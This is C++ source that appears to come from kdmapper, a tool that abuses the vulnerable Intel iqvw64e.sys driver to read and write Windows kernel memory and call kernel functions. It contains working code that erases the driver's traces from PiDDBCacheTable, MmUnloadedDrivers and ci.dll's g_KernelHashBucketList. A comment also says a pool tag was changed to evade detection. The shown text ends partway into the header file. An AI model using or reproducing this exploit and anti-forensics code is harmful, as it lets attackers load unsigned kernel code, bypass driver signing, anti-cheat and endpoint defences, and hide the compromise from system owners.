	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif


	return result;
}

uint64_t intel_driver::MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size)
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;
	
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)"PAGELK", intel_driver::ntoskrnlAddr, 
			(BYTE*)"\xE8\x00\x00\x00\x00\x48\x8B\xF0\x48\x85\xC0\x0F\x84\x00\x00\x00\x00\x44\x8B\xC5\x33\xD2\x48\x8B\xC8\xE8\x00\x00\x00\x00\x48\x8D\x46\x3F\x48\x83\xE0\xC0", 
			(char*)"x????xxxxxxxx????xxxxxxxxx????xxxxxxxx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}

		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
	}

	if (!intel_driver::CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF", 
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}

		kernel_MmFreeIndependentPages += 8;

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
	}

	uint64_t result{};
	return intel_driver::CallKernelFunction(device_handle, &result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		Log(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;
	
	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
			(BYTE*)"\x41\xB8\x00\x00\x00\x00\x48\x00\x00\x00\x8B\x00\xE8\x00\x00\x00\x00\x84\xC0\x74\x09\x48\x81\xEB\x00\x00\x00\x00\xEB", 
			(char*)"xx????x???x?x????xxxxxxx????x");
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}

		kernel_MmSetPageProtection += 12;

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
	}

	BOOLEAN set_prot_status{};
	if (!intel_driver::CallKernelFunction(device_handle, &set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

/*added by psec*/
uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocatePagesForMdl");

	if (!kernel_MmAllocatePagesForMdl)
	{
		Log(L"[!] Failed to find MmAlocatePagesForMdl" << std::endl);
		return 0;
	}

	uint64_t allocated_pages = 0;

	if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes))
		return 0;

	return allocated_pages;
}

uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");

	if (!kernel_MmMapLockedPagesSpecifyCache)
	{
		Log(L"[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl);
		return 0;
	}

	uint64_t starting_address = 0;

	if (!CallKernelFunction(device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
		return 0;

	return starting_address;
}

bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmProtectMdlSystemAddress");

	if (!kernel_MmProtectMdlSystemAddress)
	{
		Log(L"[!] Failed to find MmProtectMdlSystemAddress" << std::endl);
		return 0;
	}

	NTSTATUS status;

	if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}


bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmUnmapLockedPages");

	if (!kernel_MmUnmapLockedPages)
	{
		Log(L"[!] Failed to find MmUnmapLockedPages" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl);
}

bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmFreePagesFromMdl");

	if (!kernel_MmFreePagesFromMdl)
	{
		Log(L"[!] Failed to find MmFreePagesFromMdl" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}
/**/

uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == 0)
	{
		if (buffer != 0)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[!] Failed to find device_object" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[!] Failed to find driver_object" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[!] Failed to find driver_section" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log(L"[!] Failed to find driver name" << std::endl);
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		Log(L"[!] Failed to read driver name" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	Log(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
	return true;
}

PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		Log(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		Log(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}

	bool out;
	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}


intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
	
	PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
}

bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver

	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D

	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if (PiDDBLockPtr == NULL) {
			Log(L"[-] Warning PiDDBLock not found" << std::endl);
			return false;
		}
		Log(L"[+] PiDDBLock found with second pattern" << std::endl);
		PiDDBLockPtr += 16; //second pattern offset
	}
	else {
		PiDDBLockPtr += 28; //first pattern offset
	}

	if (PiDDBCacheTablePtr == NULL) {
		Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	Log("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);

	//context part is not used by lookup, lock or delete why we should use it?

	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	Log(L"[+] PiDDBLock Locked" << std::endl);

	auto n = GetDriverNameW();

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

	if (!WriteMemory(device_handle, (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	if (!WriteMemory(device_handle, (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		Log(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	//Decrement delete count
	ULONG cacheDeleteCount = 0;
	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	// release the ddb resource lock
	ExReleaseResourceLite(device_handle, PiDDBLock);

	Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);

	return true;
}

uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		Log(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		Log(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(device_handle, dwAddress, sectionData.get(), dwLen)) {
		Log(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = utils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);

	if (result <= 0) {
		Log(L"[-] Can't find pattern" << std::endl);
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
		Log(L"[-] Can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		Log(L"[-] Can't find section" << std::endl);
		return 0;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		Log(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel(device_handle, "PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig) {
		Log(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		Log(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		Log(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}

	Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[+] g_HashCacheLock Locked" << std::endl);

	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool(device_handle, (uintptr_t)entry)) {
					Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				return true;
			}
		}
		prev = entry;
		//read next
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
	}
	return false;
}
```

`kdmapper/kdmapper/intel_driver.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <atlstr.h>
#include <memory>

#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"
#include <assert.h>

namespace intel_driver
{
	extern char driver_name[100]; //"iqvw64e.sys"
	constexpr uint32_t ioctl1 = 0x80862007;
